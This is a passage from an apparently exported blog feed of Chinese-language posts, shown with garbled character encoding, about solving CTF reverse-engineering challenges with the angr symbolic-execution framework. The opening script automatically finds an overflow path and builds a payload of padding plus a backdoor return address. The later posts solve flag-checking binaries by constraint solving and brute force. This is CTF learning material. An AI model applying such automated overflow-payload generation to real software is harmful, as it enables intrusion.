            <span class="token comment">#LOG# print("LOAD string size: ",str_size)</span>
            st1_str1 <span class="token operator">=</span> st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt1<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st1_str2 <span class="token operator">=</span> st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt2<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

            st1<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>st1_str1 <span class="token operator">==</span> st1_str2<span class="token punctuation">)</span>

            st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># ä¸ç­‰</span>
            st2_pt1 <span class="token operator">=</span> st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsi
            st2_pt2 <span class="token operator">=</span> st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi
            st2_str1 <span class="token operator">=</span> st2<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt1<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st2_str2 <span class="token operator">=</span> st2<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt2<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st2<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>st2_str1 <span class="token operator">!=</span> st2_str2<span class="token punctuation">)</span>
        
        <span class="token keyword">for</span> i <span class="token keyword">in</span> sucs<span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> all_blocks<span class="token punctuation">:</span>
                all_blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">if</span> i<span class="token punctuation">.</span>addr <span class="token operator">==</span> <span class="token number">0x401272</span> <span class="token keyword">and</span> st<span class="token punctuation">.</span>addr <span class="token keyword">not</span> <span class="token keyword">in</span> may_has_overflow_block_addr<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LOG: FIND ONE MAY OVERFLOW "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
                size <span class="token operator">=</span> i<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># å–å‡º size</span>
                all_ins <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns
                <span class="token keyword">if</span> all_ins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'lea'</span><span class="token punctuation">:</span>
                    op_str <span class="token operator">=</span> all_ins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>op_str
                    find_0x<span class="token operator">=</span> op_str<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
                    off <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>op_str<span class="token punctuation">[</span>find_0x<span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span>base <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> size <span class="token operator">></span> off<span class="token punctuation">:</span>
                        <span class="token keyword">global</span> out_off
                        <span class="token keyword">global</span> out_size
                        out_off <span class="token operator">=</span> off
                        out_size <span class="token operator">=</span> size
                        has_overflow<span class="token punctuation">.</span>append<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
                        sts<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span>
            sts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    result <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>has_overflow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        res_st <span class="token operator">=</span> has_overflow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        symbol_size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
            my_type <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
            my_size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>my_type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                tmp_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> my_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                result <span class="token operator">+=</span> tmp_str <span class="token operator">+</span> <span class="token string">b' '</span>
            <span class="token keyword">elif</span> <span class="token punctuation">(</span>my_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> my_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>
        result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>back_door<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>ç¬¦å·æ‰§è¡Œ</category>
        <category>Angr</category>
      </categories>
      <tags>
        <tag>ç¬¦å·æ‰§è¡Œ</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr å­¦ä¹ ä¸å®è·µ</title>
    <url>/2021/08/16/angr_learn_introduction/</url>
    <content><![CDATA[<h1 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h1><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><h3 id="little-engine-DONE"><a href="#little-engine-DONE" class="headerlink" title="little_engine | DONE"></a>little_engine | DONE</h3><blockquote>
<p>Script author: Michael Reeves (github: @mastermjr)<br>Script runtime: 3 min 26 seconds (206 seconds)<br>Concepts presented:<br>stdin constraining, concrete optimization with Unicorn</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/main.jpg" alt="main"></p>
<p>æ˜ å…¥çœ¼å¸˜çš„çœ‹ä¸Šå»åº”è¯¥æ˜¯ CPP ç¼–è¯‘çš„ç¨‹åºã€‚ä¼¼ä¹æ˜¯å› ä¸ºä¸€äº›ä¼˜åŒ–æˆ–è€…è¯­è¨€æœ¬èº«çš„é—®é¢˜ï¼Œç®€å•çš„ä¸€ä¸ªç¨‹åºæµï¼Œçœ‹ä¸Šå»æå…¶è¯¡å¼‚ã€‚åŠ¨è°ƒåå¾—çŸ¥ã€‚ç¨‹åºä¼šåæ‰ç¬¬ä¸€ä¸ªè¾“å…¥çš„å­—ç¬¦(å­—ç¬¦çš„asciiè¦å°äº 0x7E)ã€‚ç„¶åå‰©ä¸‹çš„æ˜¯è¾“å…¥ flag ï¼Œflag çš„é•¿åº¦æ˜¯ 75ï¼Œä¸åŒå‡½æ•°ä¹‹é—´é€šè¿‡ RDI ä¼ é€’ä¼ å‡ºå­—ç¬¦ä¸²ç­‰å‚æ•°ã€‚åœ¨åˆ†æçš„æ—¶å€™ä¼šå‘ç°ç¨‹åºä¼šæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²è½¬å‚¨åˆ° RDI æ‰€æŒ‡å‘çš„ä¸€ä¸ªæ•°æ®ç»“æ„ä¸­ã€‚æ ¹æ®ä¸åŒçš„é•¿åº¦è¿›è¡Œä¸åŒçš„è½¬å‚¨ï¼ˆæˆ‘æ‰“èµŒæºç¨‹åºçŒ¿ä¸å¯èƒ½å†™å‡ºè¿™ç§ä¸œè¥¿ï¼‰<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/store.jpg" alt="store"></p>
<p>ç„¶åç»è¿‡ä¸€ä¸ªç®€å•çš„åŠ å¯†ï¼Œä¸æ¸…æ¥šä»€ä¹ˆç®—æ³•ï¼Œè¿™éƒ¨åˆ†é€šè¿‡ angr å½“ä¸€ä¸ªé»‘ç›’ä¸ç®¡äº†ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/encrypt2.jpg" alt="encrypt"></p>
<p>æœ€åé€šè¿‡åœ¨æ­»äº¡çš„è·¯å¾„ä¸­ï¼Œå¯»æ‰¾è¾“å‡ºæµä¸­å­˜åœ¨ â€œChuggaâ€ çš„ï¼Œå°±èƒ½å¾—åˆ° flag çš„æ±‚è§£çš„ç»“æœã€‚</p>
<p>æ¨¡ä»¿çš„ Script author: Michael Reeves (github: @mastermjr)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> IPython

<span class="token comment"># import string</span>

<span class="token comment"># å…³äºè¿™ä¸ªæ•°å­—æˆ‘æˆ‘ä¸æ¸…æ¥šä¸ºä»€ä¹ˆè¾“å…¥æµæ˜¯ä¸¤ä¸ªä¸¤ä¸ªçš„çŠ¶æ€</span>
<span class="token comment"># åŸä½œè€…è¯´å› ä¸ºå®ƒæœ‰å››å€çš„æ•°ç»„é•¿åº¦ï¼Œæ‰€ä»¥å®ƒä½¿ç”¨çš„æ˜¯ len = 1+75*4,ä¸è¿‡æˆ‘æš‚æ—¶æ²¡æœ‰è§‚å¯Ÿåˆ°è¿™ä¸ªç°è±¡ï¼Œç–‘æƒ‘ä¸­,ç¬¦å·å°‘ä¸€ç‚¹ä¹Ÿå¯ä»¥çš„ æ¯”å¦‚ 1+75*2</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./engine"</span><span class="token punctuation">)</span>
    input_length <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">75</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>input_length<span class="token punctuation">)</span><span class="token punctuation">]</span>

    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        <span class="token comment"># ä¸ä½¿ç”¨å·®ä¸å¤šå·®ä¸ª 50 ç§’</span>
        <span class="token comment"># add_options=angr.options.unicorn,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>
    <span class="token comment"># æ·»åŠ çº¦æŸ,å¯æ‰“å°å­—ç¬¦,ascii è¡¨ä¸­çš„ 32~126 ï¼Œstring.printable</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        <span class="token comment"># æ³¨æ„è§„é¿ ' ' å¦åˆ™ä¼šé™·å…¥ libc ä¸­</span>
        state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>

    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># è®¡ç®—æ—¶é—´</span>
    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Time: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># ä»ç»“æŸï¼ˆæ­»äº¡ï¼‰çš„è·¯å¾„ä¸­å¯»æ‰¾è¾“å‡ºè¿‡æˆåŠŸå­—ç¬¦ä¸²çš„çŠ¶æ€</span>

    target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> sm<span class="token punctuation">.</span>deadended<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">b'Chugga'</span> <span class="token keyword">in</span> i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    <span class="token keyword">if</span> target<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æˆ‘æœ‰è®¸å¤šåœ°æ–¹æ²¡ææ˜ç™½ ï¼Œç¬¬ä¸€æ˜¯è¾“å…¥æµï¼Œè¾“å‡ºæµï¼Œç¬¦å·æ•°é‡çš„é—®é¢˜ï¼Œç¬¬äºŒä¸ªæ˜¯æ±‚è§£å¼•æ“ä¸ºä»€ä¹ˆæ˜¯ unicorn ï¼Œè¦çœ‹çœ‹æºç äº†ã€‚</p>
<h3 id="Whitehat-CTF-2015-Crypto-400-DONE"><a href="#Whitehat-CTF-2015-Crypto-400-DONE" class="headerlink" title="Whitehat CTF 2015 - Crypto 400 |DONE"></a>Whitehat CTF 2015 - Crypto 400 |DONE</h3><blockquote>
<p>Script author: Yan Shoshitaishvili (github: @Zardus)<br>Script runtime: 30 seconds<br>Concepts presented: statically linked binary (manually hooking with function summaries), commandline argument, partial solutions</p>
</blockquote>
<p>è¿™ä¸ªæ ·ä¾‹æ˜¯å…ˆæ‰¾åˆ°éƒ¨åˆ†è§£çš„è·¯å¾„ï¼Œç„¶åå†ç”¨éƒ¨åˆ†è§£çˆ†ç ´å‡ºæœ€åçš„ flag ç”±äºåªæœ‰ 8 byte çš„ flag ï¼Œæ‰€ä»¥åªç”¨äº† 30s ï¼Œä¸è¿‡è¿˜å¥½åªæœ‰ 8 ä¸ªå­—èŠ‚ï¼Œå°±ç®—åªæœ‰ 32 ä¸ªå­—èŠ‚ï¼Œä¼°è®¡çˆ†ç ´å°±ä¸æ˜¯å¾ˆè¡Œäº†ï¼Œè¿˜æ˜¯å¾—çº¦æŸæ±‚è§£ï¼Œä¸è¿‡æ€ä¹ˆéƒ¨åˆ†è§£çš„ï¼Œè¿˜æ˜¯æœ‰å¿…è¦è§‚æ‘©ä¸€ä¸‹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_17-14-34.jpg" alt="Snipaste_2021-07-28_17-14-34"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_17-14-24.jpg" alt="Snipaste_2021-07-28_17-14-24"></p>
<p>æ‰¾åˆ° main ä¹‹åé€šè¿‡ check1 ï¼Œå¯ä»¥æœ‰å¤šè§£ï¼Œç„¶åå†çˆ†ç ´ check2,ä¸è¿‡è¿™ä¸ªè„šæœ¬ä¹Ÿæœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„åœ°æ–¹ï¼Œå°±æ˜¯ç”¨äº† progressbarï¼Œæ¯”è¾ƒç›´è§‚</p>
<p>åŸè„šæœ¬ <a href="https://github.com/angr/angr-doc/tree/master/examples/whitehat_crypto400/solve.py">whitehat_crypto400_scrypt</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ç¨å¾® mark ä¸€äº›å†™æ³•ï¼ŒæŒºæœ‰æ„æ€çš„</span>
<span class="token comment"># hook å‡½æ•°ï¼Œæˆ–è€…æŸå¤„çš„ç®€æ˜“æ–¹æ³•</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4018B0</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'glibc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x422690</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'memcpy'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">hook_length</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">8</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x40168e</span><span class="token punctuation">,</span> hook_length<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    
<span class="token comment"># ç»™å†…å­˜æ·»åŠ çº¦æŸ</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        b <span class="token operator">=</span> s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x6C4B20</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>b <span class="token operator">>=</span> <span class="token number">0x21</span><span class="token punctuation">,</span> b <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">)</span>

<span class="token comment"># çˆ†ç ´å‡†å¤‡ itertools </span>
    possible_values <span class="token operator">=</span> <span class="token punctuation">[</span> s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x6C4B20</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>
    possibilities <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token operator">*</span>possible_values<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token comment"># æ•°ç»„æ‰§è¡Œæ—¶çš„åŠ¨ç”»</span>
<span class="token keyword">def</span> <span class="token function">bruteforce_possibilities</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># let's try those values!</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] example guess: %r'</span> <span class="token operator">%</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>possibilities<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] brute-forcing %d possibilities'</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> progressbar<span class="token punctuation">.</span>ProgressBar<span class="token punctuation">(</span>widgets<span class="token operator">=</span><span class="token punctuation">[</span>progressbar<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>Percentage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>Bar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>ETA<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">:</span>
        guess_str <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
        stdout<span class="token punctuation">,</span>_ <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./whitehat_crypto400"</span><span class="token punctuation">,</span> guess_str<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'FLAG IS'</span> <span class="token keyword">in</span> stdout<span class="token punctuation">:</span>
